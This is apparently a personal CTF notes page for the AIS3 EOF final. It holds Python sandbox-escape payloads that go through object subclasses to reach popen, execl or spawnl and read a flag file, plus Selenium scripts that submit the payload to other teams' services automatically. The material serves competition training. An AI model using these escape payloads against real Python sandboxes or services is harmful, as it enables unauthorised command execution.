<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  EOF AIS3 Final
  #


  tags: CTF AIS3
  #


  Reference
  #

https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/
https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html
https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md
SSTI: https://www.freebuf.com/articles/network/258136.html
https://www.compart.com/en/unicode/U+FF5B
https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection
Payload:
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl'](&#34;/bin/cat&#34;, &#34;cat&#34;, &#34;./flag.txt&#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen'](&#34;cat /flag.txt&#34;))

file = 'FLAG.TXT'
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl'](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))

file = 'FLAG.TXT'
command = 'EXECL'
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))


file = 'FLAG.TXT'
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', &#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))

  Script - run_script.py
  #

:::spoiler
import subprocess
import time
import multiprocessing as mp


def cycle(i):
    subprocess.call(['python', 'script.py', '--team', str(i)])

if __name__ == &#34;__main__&#34;:
    p1 = mp.Process(target=cycle, args=('1',))
    p2 = mp.Process(target=cycle, args=('2',))
    # p3 = mp.Process(target=cycle, args=('3',))
    # p4 = mp.Process(target=cycle, args=('4',))
    # p5 = mp.Process(target=cycle, args=('5',))
    # p7 = mp.Process(target=cycle, args=('7',))
    # p8 = mp.Process(target=cycle, args=('8',))
    # p9 = mp.Process(target=cycle, args=('9',))
    # p10 = mp.Process(target=cycle, args=('10',))
    # p11 = mp.Process(target=cycle, args=('11',))
    # p12 = mp.Process(target=cycle, args=('12',))
    # p13 = mp.Process(target=cycle, args=('13',))
    # p14 = mp.Process(target=cycle, args=('14',))
    # p15 = mp.Process(target=cycle, args=('15',))
    # p16 = mp.Process(target=cycle, args=('16',))
    # p17 = mp.Process(target=cycle, args=('17',))
    # p18 = mp.Process(target=cycle, args=('18',))
    # p19 = mp.Process(target=cycle, args=('19',))
    # p20 = mp.Process(target=cycle, args=('20',))
    # p21 = mp.Process(target=cycle, args=('21',))
    # p22 = mp.Process(target=cycle, args=('22',))
    # p23 = mp.Process(target=cycle, args=('23',))
    # p24 = mp.Process(target=cycle, args=('24',))
    

    p1.start()
    time.sleep(2)
    p2.start()
    time.sleep(2)
    # p3.start()
    # p4.start()
    # p5.start()
    # p7.start()
    # p8.start()
    # p9.start()
    # p10.start()
    # p11.start()
    # p12.start()
    # p13.start()
    # p14.start()
    # p15.start()
    # p16.start()
    # p17.start()
    # p18.start()
    # p19.start()
    # p20.start()
    # p21.start()
    # p22.start()
    # p23.start()
    # p24.start()

    p1.join()
    p2.join()
    # p3.join()
    # p4.join()
    # p5.join()
    # p7.join()
    # p8.join()
    # p9.join()
    # p10.join()
    # p11.join()
    # p12.join()
    # p13.join()
    # p14.join()
    # p15.join()
    # p16.join()
    # p17.join()
    # p18.join()
    # p19.join()
    # p20.join()
    # p21.join()
    # p22.join()
    # p23.join()
    # p24.join()
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/competition/eof-ais3-final/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="EOF AIS3 Final"><meta property="og:description" content="EOF AIS3 Final # tags: CTF AIS3 # Reference # https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/
https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html
https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md
SSTI: https://www.freebuf.com/articles/network/258136.html https://www.compart.com/en/unicode/U+FF5B https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection
Payload:
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl'](&#34;/bin/cat&#34;, &#34;cat&#34;, &#34;./flag.txt&#34;)) print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen'](&#34;cat /flag.txt&#34;)) file = 'FLAG.TXT' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl'](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower())) file = 'FLAG.TXT' command = 'EXECL' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower())) file = 'FLAG.TXT' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', &#34;/bin/cat&#34;, &#34;cat&#34;, file.lower())) Script - run_script.py # :::spoiler
import subprocess import time import multiprocessing as mp def cycle(i): subprocess.call(['python', 'script.py', '--team', str(i)]) if __name__ == &#34;__main__&#34;: p1 = mp.Process(target=cycle, args=('1',)) p2 = mp.Process(target=cycle, args=('2',)) # p3 = mp.Process(target=cycle, args=('3',)) # p4 = mp.Process(target=cycle, args=('4',)) # p5 = mp.Process(target=cycle, args=('5',)) # p7 = mp.Process(target=cycle, args=('7',)) # p8 = mp.Process(target=cycle, args=('8',)) # p9 = mp.Process(target=cycle, args=('9',)) # p10 = mp.Process(target=cycle, args=('10',)) # p11 = mp.Process(target=cycle, args=('11',)) # p12 = mp.Process(target=cycle, args=('12',)) # p13 = mp.Process(target=cycle, args=('13',)) # p14 = mp.Process(target=cycle, args=('14',)) # p15 = mp.Process(target=cycle, args=('15',)) # p16 = mp.Process(target=cycle, args=('16',)) # p17 = mp.Process(target=cycle, args=('17',)) # p18 = mp.Process(target=cycle, args=('18',)) # p19 = mp.Process(target=cycle, args=('19',)) # p20 = mp.Process(target=cycle, args=('20',)) # p21 = mp.Process(target=cycle, args=('21',)) # p22 = mp.Process(target=cycle, args=('22',)) # p23 = mp.Process(target=cycle, args=('23',)) # p24 = mp.Process(target=cycle, args=('24',)) p1.start() time.sleep(2) p2.start() time.sleep(2) # p3.start() # p4.start() # p5.start() # p7.start() # p8.start() # p9.start() # p10.start() # p11.start() # p12.start() # p13.start() # p14.start() # p15.start() # p16.start() # p17.start() # p18.start() # p19.start() # p20.start() # p21.start() # p22.start() # p23.start() # p24.start() p1.join() p2.join() # p3.join() # p4.join() # p5.join() # p7.join() # p8.join() # p9.join() # p10.join() # p11.join() # p12.join() # p13.join() # p14.join() # p15.join() # p16.join() # p17.join() # p18.join() # p19.join() # p20.join() # p21.join() # p22.join() # p23.join() # p24.join() :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="AIS3"><title>EOF AIS3 Final | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/competition/eof-ais3-final/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>EOF AIS3 Final</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#reference>Reference</a></li><li><a href=#script---run_scriptpy>Script - run_script.py</a></li><li><a href=#script---scriptpy>Script - script.py</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=eof-ais3-final>EOF AIS3 Final
<a class=anchor href=#eof-ais3-final>#</a></h1><h6 id=tags-ctf-ais3>tags: <code>CTF</code> <code>AIS3</code>
<a class=anchor href=#tags-ctf-ais3>#</a></h6><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/>https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/</a></p><p><a href=https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html>https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html</a></p><p><a href=https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md>https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md</a></p><p>SSTI: <a href=https://www.freebuf.com/articles/network/258136.html>https://www.freebuf.com/articles/network/258136.html</a>
<a href=https://www.compart.com/en/unicode/U+FF5B>https://www.compart.com/en/unicode/U+FF5B</a>
<a href=https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection>https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection</a></p><p>Payload:</p><pre tabindex=0><code class=language-python! data-lang=python!>print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;execl&#39;](&#34;/bin/cat&#34;, &#34;cat&#34;, &#34;./flag.txt&#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#34;cat /flag.txt&#34;))

file = &#39;FLAG.TXT&#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;execl&#39;](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))

file = &#39;FLAG.TXT&#39;
command = &#39;EXECL&#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))


file = &#39;FLAG.TXT&#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;spawnl&#39;](&#39;P_WAIT&#39;, &#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))
</code></pre><h2 id=script---run_scriptpy>Script - run_script.py
<a class=anchor href=#script---run_scriptpy>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-python=" data-lang="python=">import subprocess
import time
import multiprocessing as mp


def cycle(i):
    subprocess.call([&#39;python&#39;, &#39;script.py&#39;, &#39;--team&#39;, str(i)])

if __name__ == &#34;__main__&#34;:
    p1 = mp.Process(target=cycle, args=(&#39;1&#39;,))
    p2 = mp.Process(target=cycle, args=(&#39;2&#39;,))
    # p3 = mp.Process(target=cycle, args=(&#39;3&#39;,))
    # p4 = mp.Process(target=cycle, args=(&#39;4&#39;,))
    # p5 = mp.Process(target=cycle, args=(&#39;5&#39;,))
    # p7 = mp.Process(target=cycle, args=(&#39;7&#39;,))
    # p8 = mp.Process(target=cycle, args=(&#39;8&#39;,))
    # p9 = mp.Process(target=cycle, args=(&#39;9&#39;,))
    # p10 = mp.Process(target=cycle, args=(&#39;10&#39;,))
    # p11 = mp.Process(target=cycle, args=(&#39;11&#39;,))
    # p12 = mp.Process(target=cycle, args=(&#39;12&#39;,))
    # p13 = mp.Process(target=cycle, args=(&#39;13&#39;,))
    # p14 = mp.Process(target=cycle, args=(&#39;14&#39;,))
    # p15 = mp.Process(target=cycle, args=(&#39;15&#39;,))
    # p16 = mp.Process(target=cycle, args=(&#39;16&#39;,))
    # p17 = mp.Process(target=cycle, args=(&#39;17&#39;,))
    # p18 = mp.Process(target=cycle, args=(&#39;18&#39;,))
    # p19 = mp.Process(target=cycle, args=(&#39;19&#39;,))
    # p20 = mp.Process(target=cycle, args=(&#39;20&#39;,))
    # p21 = mp.Process(target=cycle, args=(&#39;21&#39;,))
    # p22 = mp.Process(target=cycle, args=(&#39;22&#39;,))
    # p23 = mp.Process(target=cycle, args=(&#39;23&#39;,))
    # p24 = mp.Process(target=cycle, args=(&#39;24&#39;,))
    

    p1.start()
    time.sleep(2)
    p2.start()
    time.sleep(2)
    # p3.start()
    # p4.start()
    # p5.start()
    # p7.start()
    # p8.start()
    # p9.start()
    # p10.start()
    # p11.start()
    # p12.start()
    # p13.start()
    # p14.start()
    # p15.start()
    # p16.start()
    # p17.start()
    # p18.start()
    # p19.start()
    # p20.start()
    # p21.start()
    # p22.start()
    # p23.start()
    # p24.start()

    p1.join()
    p2.join()
    # p3.join()
    # p4.join()
    # p5.join()
    # p7.join()
    # p8.join()
    # p9.join()
    # p10.join()
    # p11.join()
    # p12.join()
    # p13.join()
    # p14.join()
    # p15.join()
    # p16.join()
    # p17.join()
    # p18.join()
    # p19.join()
    # p20.join()
    # p21.join()
    # p22.join()
    # p23.join()
    # p24.join()
</code></pre><p>:::</p><h2 id=script---scriptpy>Script - script.py
<a class=anchor href=#script---scriptpy>#</a></h2><pre tabindex=0><code class="language-python!=" data-lang="python!=">from selenium.webdriver.chrome.options import Options
import time
from http.client import PAYMENT_REQUIRED
from selenium import webdriver
from selenium.webdriver.common.keys import Keys #send keys on keyboard

&#39;&#39;&#39;hault the page until it find some label appear on the page&#39;&#39;&#39;
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

&#39;&#39;&#39;imitate the action that human execute on mouse and keyboard&#39;&#39;&#39;
from selenium.webdriver.common.action_chains import ActionChains

&#39;&#39;&#39;to do some keyboard instruction-&#39;&#39;&#39;
import pyautogui
import time
import argparse

def parse_args():
    parser = argparse.ArgumentParser()
    &#39;&#39;&#39;ARM&#39;&#39;&#39;
    parser.add_argument(&#39;--team&#39;, type=str, default=&#39;1&#39;, help=&#39;team id.&#39;)

    return parser.parse_args()
    
def read_write_file(type, write_data = None):
    file_path = &#39;D:/Download/test.txt&#39;
    if type == &#39;r&#39;:
        f = open(file_path, &#39;r&#39;, encoding=&#34;utf-8&#34;) #u must add encoding parameter
        arr = []
        for line in f.readlines():
            arr.append(line)
        f.close()
        return arr
    elif type == &#39;a&#39;:
        f = open(file_path, &#39;a&#39;, encoding=&#39;UTF-8&#39;)
        f.write(write_data + &#39;\n&#39;)
        f.close()
    elif type == &#39;refresh&#39;:
        f = open(file_path, &#39;w&#39;, encoding=&#39;UTF-8&#39;)
        f.write(&#39;&#39;)
        f.close()

args = parse_args() 


from selenium.webdriver.support.wait import WebDriverWait
driver = webdriver.Chrome(&#39;D:/Download/chromedriver.exe&#39;)
driver.get(&#34;http://10.11.0.1:5001/panel&#34;)

token = &#39;123&#39;
payload = &#34;print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;cat flag.txt&#39;).read())&#34;


&#39;&#39;&#39;Login&#39;&#39;&#39;
text_input = driver.find_element(By.ID, &#34;token&#34;)
ActionChains(driver).send_keys_to_element(text_input, token).perform()
driver.find_element(By.TAG_NAME, &#39;button&#39;).click()
time.sleep(5)

&#39;&#39;&#39;Choose which team&#39;&#39;&#39;
# from selenium.webdriver.support.ui import Select
# select = Select(driver.find_element(By.NAME, &#39;target&#39;))
# select.select_by_index(0)
# from selenium.webdriver.common.keys import Keys
# for op in select.options:
#     if op.text != &#39;--------passing_baseline_v2---------&#39;:
#         css_panel = driver.find_element(By.CLASS_NAME, &#34;CodeMirror&#34;)
#         print(css_panel)
#         code_mirror_element = css_panel.find_element(By.XPATH, &#34;/html/body/main/form[2]/p[2]/div/div[1]/textarea&#34;)
#         print(code_mirror_element)
#         code_mirror_element.send_keys(Keys.CONTROL + &#34;a&#34;)
#     time.sleep(5)
#     print(op.text)

&#39;&#39;&#39;Send Payload&#39;&#39;&#39;
cursor = driver.find_element(By.XPATH, &#34;//form[@id=&#39;jail-form&#39;]/p/div/div[6]&#34;)
cursor.click()
pyautogui.hotkey(&#39;ctrl&#39;,&#39;a&#39;)
pyautogui.hotkey(&#39;delete&#39;)
ActionChains(driver).send_keys_to_element(cursor, payload).perform()
time.sleep(5)  # Scrolled down by user
driver.find_element(By.XPATH, &#39;/html/body/main/form/button&#39;).click()
time.sleep(5)

&#39;&#39;&#39;Catch Response &amp; Write to file&#39;&#39;&#39;
print(driver.find_element(By.XPATH, &#39;/html/body/div/div/div[2]&#39;))
print(args.team)
# read_write_file(&#39;a&#39;, 123)
</code></pre></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#reference>Reference</a></li><li><a href=#script---run_scriptpy>Script - run_script.py</a></li><li><a href=#script---scriptpy>Script - script.py</a></li></ul></nav></div></aside></main></body></html>